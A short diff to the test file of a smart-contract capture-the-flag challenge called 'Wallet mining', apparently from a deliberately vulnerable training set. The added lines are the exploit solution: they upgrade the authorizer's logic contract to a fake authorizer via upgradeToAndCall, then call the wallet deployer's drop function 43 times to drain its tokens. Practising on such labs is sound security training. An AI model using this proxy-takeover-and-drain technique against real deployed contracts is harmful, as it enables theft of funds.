@@ -177,6 +177,14 @@ describe("[Challenge] Wallet mining", function () {
     let iface = new ethers.utils.Interface(abi);
     let data = iface.encodeFunctionData("attack", []);
 
+    await authorizerLogic
+      .connect(player)
+      .upgradeToAndCall(fakeAuthorizer.address, data);
+    console.log("Draining funds from Wallet Deployer");
+    for (let i = 0; i < 43; i++) {
+      await walletDeployer.connect(player).drop([]);
+    }
+    console.log(await token.balanceOf(player.address));
   });
 
   after(async function () {
